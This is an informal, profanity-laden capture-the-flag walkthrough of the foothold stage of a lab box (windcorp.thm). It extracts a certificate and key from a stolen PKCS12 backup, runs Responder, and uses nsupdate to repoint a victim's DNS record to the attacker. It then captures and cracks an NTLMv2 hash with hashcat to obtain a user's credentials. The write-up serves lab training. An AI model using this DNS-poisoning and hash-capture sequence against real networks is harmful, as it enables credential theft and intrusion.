# Foothold
## User hashes

Right fucko, follow this carefully because this is volatile as fuck...

You want to edit the responder config located at `/etc/responder/Responder.conf` and put **absolute** paths to the god damn SSL CERT/KEY

You want to extract the key and certificate from the pkcs12 that you pulled from `https://selfservice.dev.windcorp.thm/backup`

Run these damn commands:

This pulls your damn key
`openssl pkcs12 -in cert.pfx -out OUTFILE.key -nodes -nocert`

`openssl pkcs12 -in cert.pfx -out OUTFILE.crt -nodes -clcerts`

Have fun more those to your damn certs responder folder.

Spin up the bad boy that is responder with 
`sudo responder -I tun0`

You then want to update the DNS records for this shit.

```
server <VICTIM SERVER>
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 1234 A <ATTACK IP>
> send
```

Then you just have to sit on your ass and wait... Enjoy the hash...

Now crack that bloody hash

`hashcat.exe -m 5600 hash.txt rockyou.txt`

enjoy...

`edwardle:<SNIP>`


right so apparently seclists doesn't have `/powershell` in. 

So use directory-2-3-medium.txt and find the powershell directory.

You have the credentials already...

